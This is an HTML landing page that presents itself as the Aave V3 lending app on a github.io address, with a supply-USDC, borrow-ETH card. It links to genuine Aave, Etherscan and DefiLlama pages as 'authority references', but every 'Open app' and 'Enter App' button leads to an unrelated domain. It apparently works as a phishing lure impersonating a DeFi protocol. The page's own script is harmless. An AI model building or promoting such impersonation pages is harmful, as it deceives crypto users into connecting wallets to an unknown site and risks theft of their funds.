<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Aave V3</title>
  <meta name="description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
  <link rel="canonical" href="https://aave-v3-app.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F5F7">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Aave V3">
  <meta property="og:description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
  <meta property="og:url" content="https://aave-v3-app.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Aave V3">
  <meta name="twitter:description" content="Aave V3 lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://aave-v3-app.github.io/#website",
        "url": "https://aave-v3-app.github.io/",
        "name": "Aave V3"
      },
      {
        "@type": "WebApplication",
        "@id": "https://aave-v3-app.github.io/#app",
        "name": "Aave V3",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://aave-v3-app.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://aave-v3-app.github.io/#organization",
        "name": "Aave",
        "url": "https://aave.com/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Aave V3 home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Aave V3</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://etherscan.io/address/0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2" target="_blank" rel="nofollow noopener noreferrer">Pool contract</a>
      <a href="https://aave.com/docs" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
      <a href="https://defillama.com/protocol/aave-v3" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Aave V3">
      <h1>Aave V3</h1>
      <p class="sub"><strong>Aave V3</strong> lets you supply and borrow crypto from your own wallet on the Aave V3 protocol.</p>
    </section>

    <section class="app-card" aria-label="Lending card">
      <div class="legs">
        <div class="leg">
          <span class="label">Supply</span>
          <span class="chip">
            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
            <span>USDC</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Swap supply and borrow assets">
          <span aria-hidden="true">&#8644;</span>
        </button>
        <div class="leg">
          <span class="label">Borrow</span>
          <span class="chip">
            <img class="token" src="eth.png" width="30" height="30" alt="ETH">
            <span>ETH</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">Aave V3 — 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;

      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
      button.classList.toggle("is-swapped");
    });
  })();
  </script>
</body>
</html>
